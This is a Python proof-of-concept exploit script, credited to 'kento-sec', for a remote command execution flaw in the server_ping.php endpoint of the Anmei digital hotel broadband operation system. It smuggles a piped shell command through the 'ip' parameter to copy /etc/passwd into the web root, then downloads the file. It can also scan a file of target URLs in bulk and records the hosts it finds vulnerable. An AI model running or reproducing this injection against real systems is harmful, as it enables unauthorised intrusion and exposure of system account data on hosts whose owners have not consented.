import requests
import argparse
import urllib3
import sys

from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings()


def title():
    print("""
                安美数字酒店宽带运营系统server_ping远程命令执行漏洞
                      use: python3  安美数字酒店宽带运营系统server_ping远程命令执行漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
            print("\033[36m[o] 正在执行 cat /etc/passwd>../../test.txt \033[0m".format(self.url))
            if "parent" in response.text and response.status_code == 200:
                vuln_url = self.url + "/test.txt"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
                if "root:" in response.text:
                    print("\033[36m[o] 目标 {} 存在安美数字酒店宽带运营系统server_ping远程命令执行漏洞 \033[0m".format(self.url))
                    print("\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(response.text))
                    with open("中安美数字酒店宽带运营系统server_ping远程命令执行漏洞结果.txt", mode="a") as rp:
                        rp.write(self.url  + "\n")
                else:
                    print("\033[31m[x] 请求失败:{} \033[0m")
                    pass
            else:
                print("\033[31m[x] 请求失败 \033[0m")
                pass
        except Exception as e:
            print("\033[31m[x] 请求失败:{} \033[0m".format(e))
            pass


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="安美数字酒店宽带运营系统server_ping远程命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 安美数字酒店宽带运营系统server_ping远程命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 安美数字酒店宽带运营系统server_ping远程命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
